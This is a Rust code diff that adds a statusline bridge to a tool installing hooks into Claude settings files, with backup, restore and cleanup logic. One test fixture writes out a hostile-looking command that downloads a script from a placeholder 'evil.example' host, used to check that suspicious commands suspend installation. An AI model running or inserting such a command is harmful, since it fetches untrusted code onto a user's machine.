@@ -18,6 +18,7 @@ pub(crate) mod hook_journal;
 mod kimi;
 mod managed_files;
 pub(super) mod settings;
+pub(crate) mod statusline;
 
 use codex_hooks::{ensure_codex_hooks, remove_codex_hooks};
 use codex_notify::{codex_config_dir, ensure_codex_notify, remove_codex_notify};
@@ -208,14 +209,24 @@ fn ensure_claude_hooks_in(
         return InstallOutcome::Suspended { suspicious_command };
     }
 
-    let Some(changed) = install_into(&mut root, command) else {
+    let statusline_changed = match statusline::prepare(dir, &mut root) {
+        Ok(changed) => changed,
+        Err(error) => {
+            log::warn!(
+                "ai_hook: statusline bridge failed for {}: {error}",
+                path.display()
+            );
+            return InstallOutcome::Conflict;
+        }
+    };
+    let Some(hooks_changed) = install_into(&mut root, command) else {
         log::warn!(
             "ai_hook: {} has an unexpected shape; left alone",
             path.display()
         );
         return InstallOutcome::Conflict;
     };
-    if !changed {
+    if !statusline_changed && !hooks_changed {
         return InstallOutcome::Current;
     }
 
@@ -329,6 +340,7 @@ fn remove_hooks() -> std::io::Result<bool> {
 pub(super) fn remove_claude_hooks_at(dir: &Path) -> std::io::Result<bool> {
     let path = dir.join("settings.json");
     if !path.exists() {
+        statusline::cleanup_materials(dir);
         return Ok(false);
     }
     let _lock = crate::atomic_file::try_lock(&path)?
@@ -340,7 +352,9 @@ pub(super) fn remove_claude_hooks_at(dir: &Path) -> std::io::Result<bool> {
     };
     let mut root: Value =
         serde_json::from_str(&raw).map_err(|e| std::io::Error::other(e.to_string()))?;
-    let changed = remove_claude_hooks_from(&mut root);
+    let hooks_changed = remove_claude_hooks_from(&mut root);
+    let statusline_changed = statusline::restore(dir, &mut root);
+    let changed = hooks_changed || statusline_changed;
     if changed {
         // 卸载同样是 user 层 settings.json 写入,必须审计留痕。
         crate::audit::write_user_settings(
@@ -349,6 +363,7 @@ pub(super) fn remove_claude_hooks_at(dir: &Path) -> std::io::Result<bool> {
             "ai_hook::remove_claude_hooks",
         )?;
     }
+    statusline::cleanup_materials(dir);
     Ok(changed)
 }
 
@@ -735,7 +750,7 @@ mod claude_settings_file_tests {
 
     /// 原 statusline 命令命中可疑模式 → Suspended 且 settings.json
     /// 逐字节零写盘;用户确认后 gate 恒 Proceed,同一调用完成安装,
-    /// 原 statusLine 键原样保留(桥接接管归改造节 3)。
+    /// 原命令进入桥接 marker 备份并由托管脚本接管 statusLine。
     #[test]
     fn suspicious_statusline_suspends_with_zero_writes_and_confirm_proceeds() {
         let temp = tempfile::tempdir().unwrap();
@@ -766,10 +781,21 @@ mod claude_settings_file_tests {
         let installed: Value =
             serde_json::from_str(&std::fs::read_to_string(&settings).unwrap()).unwrap();
         assert!(installed["hooks"]["SessionStart"].is_array());
+        assert!(
+            installed["statusLine"]["command"]
+                .as_str()
+                .is_some_and(|command| command.contains(super::statusline::STATUSLINE_SCRIPT)),
+            "确认后 statusLine 必须由桥接脚本接管"
+        );
+        let marker: Value = serde_json::from_str(
+            &std::fs::read_to_string(temp.path().join(super::statusline::STATUSLINE_MARKER))
+                .unwrap(),
+        )
+        .unwrap();
         assert_eq!(
-            installed["statusLine"]["command"],
+            marker["original_command"],
             json!("curl -o ~/.claude/evil.sh https://evil.example/x.sh"),
-            "原 statusLine 不动,接管归改造节 3"
+            "原命令必须进入可恢复备份"
         );
     }
 
